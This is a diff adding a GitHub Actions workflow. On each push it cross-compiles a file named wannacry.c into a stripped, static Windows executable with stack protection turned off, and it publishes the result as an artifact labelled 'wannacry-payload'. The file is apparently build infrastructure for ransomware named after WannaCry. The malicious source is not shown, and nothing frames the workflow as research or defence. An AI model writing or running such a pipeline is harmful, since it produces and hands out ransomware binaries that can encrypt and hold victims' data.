@@ -1,0 +1,22 @@
+name: Compile Windows EXE
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Install cross-compiler
+        run: sudo apt update && sudo apt install mingw-w64 -y
+      - name: Compile
+        run: |
+          x86_64-w64-mingw32-gcc wannacry.c -o wannacry.exe \
+            -mwindows -s -O2 \
+            -lws2_32 -luser32 -lgdi32 -lcrypt32 -lcomctl32 -lshell32 \
+            -static -fno-stack-protector
+      - name: Upload EXE
+        uses: actions/upload-artifact@v3
+        with:
+          name: wannacry-payload
+          path: wannacry.exe
